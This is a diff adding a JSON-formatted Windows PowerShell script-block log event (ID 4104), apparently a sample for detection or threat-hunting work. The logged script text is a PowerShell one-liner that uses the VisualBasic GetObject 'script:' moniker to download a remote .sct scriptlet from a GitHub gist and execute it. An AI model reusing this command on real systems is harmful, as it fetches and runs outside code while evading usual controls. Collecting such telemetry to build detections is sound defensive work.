@@ -1,0 +1,56 @@
+{
+    "Event": {
+        "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+        "System": {
+            "Provider": {
+                "Name": "Microsoft-Windows-PowerShell",
+                "Guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"
+            },
+            "EventID": "4104",
+            "Version": "1",
+            "Level": "5",
+            "Task": "2",
+            "Opcode": "15",
+            "Keywords": "0x0",
+            "TimeCreated": {
+                "SystemTime": "2023-06-27T03:33:34.168514100Z"
+            },
+            "EventRecordID": "1247180",
+            "Correlation": {
+                "ActivityID": "{fc27780d-9e5b-0000-3640-8bfd5b9ed901}"
+            },
+            "Execution": {
+                "ProcessID": "2040",
+                "ThreadID": "5388"
+            },
+            "Channel": "Microsoft-Windows-PowerShell/Operational",
+            "Computer": "pc.domain.loc",
+            "Security": {
+                "UserID": "S-1-5-21-936165926-1453112849-1990505774-500"
+            }
+        },
+        "EventData": {
+            "Data": [
+                {
+                    "text": "1",
+                    "Name": "MessageNumber"
+                },
+                {
+                    "text": "1",
+                    "Name": "MessageTotal"
+                },
+                {
+                    "text": "[Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');[Microsoft.VisualBasic.Interaction]::GetObject('script:https://gist.githubusercontent.com/bohops/72031fecb0f58531753f51d4ef2b86e9/raw/805dcca541e6b5efa1420e8758eaea9c3487dcf0/notepad.sct').Exec(0)",
+                    "Name": "ScriptBlockText"
+                },
+                {
+                    "text": "3871b1c0-2e6f-43b2-8e2b-bfd63ac29764",
+                    "Name": "ScriptBlockId"
+                },
+                {
+                    "Name": "Path"
+                }
+            ]
+        }
+    }
+}
